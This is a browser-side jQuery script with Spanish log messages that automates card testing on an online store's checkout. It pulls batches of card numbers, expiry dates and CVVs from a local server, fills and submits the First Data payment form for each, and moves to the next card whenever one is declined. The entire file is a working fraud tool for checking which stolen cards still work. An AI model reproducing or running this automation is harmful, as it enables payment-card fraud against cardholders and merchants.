var postUrl = "http://localhost:5000/post";
var iteration = null;
var options = {
     url:postUrl,
     dataType: "jsonp"
};
var iteration = null;
var interval;
var interval2;
var interval3;
var cards = function(arr) {
	var i = 0;
	var len = arr.length;

	iteration = function() {
	  if( i < len ) {
	    jQuery(jQuery(".changelink a")[7]).click();
	    var json = arr[i++];
	    sessionStorage.card = JSON.stringify(json);

      	interval = setInterval(function() {
	        console.log("Abriendo el edit...")
	        if ( jQuery("#checkout-step-payment").css("display") == "block" ) {
	        	clearInterval(interval);
	        	console.log("Edit abierto");

	        	if( json.card[0] == 4 )
	        		jQuery("#firstdataglobalgateway_cc_type").val("VI")
	        	else
	        		jQuery("#firstdataglobalgateway_cc_type").val("MC")

	        	jQuery("#firstdataglobalgateway_cc_number").val(json.card);

				jQuery("#firstdataglobalgateway_expiration").val( Number( json.mon ) );
				jQuery(jQuery(".inner")[5]).text(
					jQuery(jQuery("#firstdataglobalgateway_expiration option")[Number(json.mon)]).text()
				);

				jQuery("#firstdataglobalgateway_expiration_yr").val("20" + json.year);
				jQuery(jQuery(".inner")[6]).text("20" + json.year);

				jQuery("#firstdataglobalgateway_cc_cid").val(json.cvv);

				jQuery(jQuery(".button")[12]).click();

				interval2 = setInterval(function() {
					console.log("Guardando la tarjeta...")
					if ( jQuery("#checkout-step-payment").css("display") == "none" ) {
						clearInterval(interval2);
						console.log("Tarjeta guardada");
						jQuery(".button.button-default.btn-checkout.button-ajax").click();
						var time = 0;
						interval3 = setInterval(function() {
							console.log('Procesando...');
							time++;
							if( jQuery("#review-buttons-container").hasClass("loading")) {
								clearInterval(interval3);
								console.log("Tarjeta rechazada, Probemos otra");
								setTimeout(iteration, 3000);
							}

						}, 1000)
					}
				}, 1000);
	        }
      	}, 1000);

	  }
	  else {
	    jQuery.ajax(options)
		.success(cards);
	  }

	}

	iteration();
};
jQuery.ajax(options)
.success(cards);